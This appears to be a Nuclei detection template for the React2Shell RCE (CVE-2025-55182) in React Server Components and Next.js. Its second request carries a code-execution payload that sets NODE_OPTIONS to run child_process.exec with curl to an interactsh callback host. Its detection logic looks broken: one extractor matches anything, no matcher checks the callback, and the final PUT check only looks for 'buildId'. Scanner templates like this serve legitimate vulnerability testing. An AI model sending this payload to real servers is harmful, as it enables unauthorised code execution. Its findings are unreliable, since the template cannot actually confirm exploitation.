id: react2shell-cve-2025-55182

info:
  name: React2Shell RCE CVE-2025-55182
  author: akm626
  severity: critical
  description: |
    Detects CVE-2025-55182 (React2Shell), a critical unauthenticated RCE vulnerability in React Server Components Flight protocol.
    Affects React 19.x and Next.js 15.x/16.x with App Router. Exploitation allows arbitrary code execution via crafted HTTP requests.
  tags: rce, react, nextjs, cve-2025-55182, critical, 2025,intrusive
variables:
  random_path: "{{rand_text_alphanumeric(8)}}"
  timestamp: "{{unix_time()}}"
  interactsh-url: "{{interactsh-url}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    extractors:
      - type: regex
        name: react_version
        internal: true
        group: 1
        regex:
          - 'react@([0-9]+\.[0-9]+\.[0-9]+)'
      - type: regex
        name: next_version
        internal: true
        group: 1
        regex:
          - 'next@([0-9]+\.[0-9]+\.[0-9]+)'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "react"
      - type: word
        part: body
        words:
          - "next"
      - type: word
        part: body
        words:
          - "_next"

  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/x-component
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0

        1:I{"id":"{{timestamp}}","name":"nuclei-test","env":{"NODE_OPTIONS":"--eval require('child_process').exec('curl {{interactsh-url}}')"}}

    extractors:
      - type: regex
        name: exploit_success
        internal: true
        regex:
          - ".*"

  - raw:
      - |
        PUT /_next/data/{{timestamp}}.json HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0

        {"page":"/_app","query":{},"buildId":"{{random_path}}","isFallback":false,"gssp":false,"scriptLoader":[]}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "next"
      - type: regex
        regex:
          - 'buildId'